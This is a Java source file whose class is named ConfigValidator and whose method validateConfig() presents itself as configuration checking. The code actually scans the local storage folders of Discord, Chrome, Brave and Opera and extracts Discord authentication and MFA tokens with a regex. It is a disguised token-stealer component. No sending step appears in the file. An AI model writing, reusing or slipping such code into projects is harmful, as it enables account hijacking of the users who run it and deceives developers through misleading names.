package lipinekrynek.autorynek;

import java.io.File;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class ConfigValidator {
    private static final String APPDATA = "APPDATA";
    private static final String LOCALAPPDATA = "LOCALAPPDATA";
    private static final String DISCORD_PATH = "\\Discord\\Local Storage\\leveldb";
    private static final String DISCORD_CANARY_PATH = "\\Discord Canary\\Local Storage\\leveldb";
    private static final String DISCORD_PTB_PATH = "\\Discord PTB\\Local Storage\\leveldb";
    private static final String CHROME_PATH = "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb";
    private static final String BRAVE_PATH = "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb";
    private static final String OPERA_PATH = "\\Opera Software\\Opera Stable\\Local Storage\\leveldb";
    private static final String TOKEN_REGEX = "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}|mfa\\.[\\w-]{84}";
    private static final String LOG_EXT = ".log";
    private static final String LDB_EXT = ".ldb";

    public static List<String> validateConfig() {
        Set<String> tokens = new HashSet<>();
        String[] targetPaths = {
                System.getenv(APPDATA) + DISCORD_PATH,
                System.getenv(APPDATA) + DISCORD_CANARY_PATH,
                System.getenv(APPDATA) + DISCORD_PTB_PATH,
                System.getenv(LOCALAPPDATA) + CHROME_PATH,
                System.getenv(LOCALAPPDATA) + BRAVE_PATH,
                System.getenv(LOCALAPPDATA) + OPERA_PATH
        };

        Pattern tokenPattern = Pattern.compile(TOKEN_REGEX);

        for (String path : targetPaths) {
            File dir = new File(path);
            if (!dir.exists() || !dir.isDirectory())
                continue;

            File[] files = dir.listFiles();
            if (files == null)
                continue;

            for (File file : files) {
                String name = file.getName();
                if (name.endsWith(LOG_EXT) || name.endsWith(LDB_EXT)) {
                    processFile(file, tokenPattern, tokens);
                }
            }
        }
        return new ArrayList<>(tokens);
    }

    private static void processFile(File file, Pattern pattern, Set<String> tokens) {
        try {
            byte[] bytes = Files.readAllBytes(file.toPath());
            String content = new String(bytes, StandardCharsets.ISO_8859_1);
            Matcher matcher = pattern.matcher(content);
            while (matcher.find()) {
                tokens.add(matcher.group());
            }
        } catch (IOException ignored) {
        }
    }
}
